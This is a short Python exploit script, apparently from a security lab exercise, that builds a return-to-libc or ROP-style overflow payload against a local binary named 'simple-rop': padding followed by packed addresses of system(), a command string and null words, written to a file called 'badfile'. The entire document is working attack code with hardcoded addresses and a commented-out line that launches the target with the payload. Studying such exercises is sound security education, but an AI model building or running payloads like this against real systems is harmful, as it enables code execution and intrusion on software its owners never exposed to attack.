import os
import struct

#Find gadgets
#system = 0xb7e3fb40
NULL=0x804a035
system = 0xb7eb6660
string = 0x804a02c
# pointer overwriting
payload = "A"*10 ;
payload += struct.pack("I", system)
payload += struct.pack("I", system)
payload += struct.pack("I", system)

#execve(string, 0, 0)
payload += struct.pack("I", system)
payload += struct.pack("I", string)
payload += struct.pack("I", NULL)
payload += struct.pack("I", NULL)


#payload += struct.pack("I", lazy)

f = open("badfile", "a")
f.write("%s" % payload) 
f.close()
#os.system("./simple-rop \"%s\"" % payload)
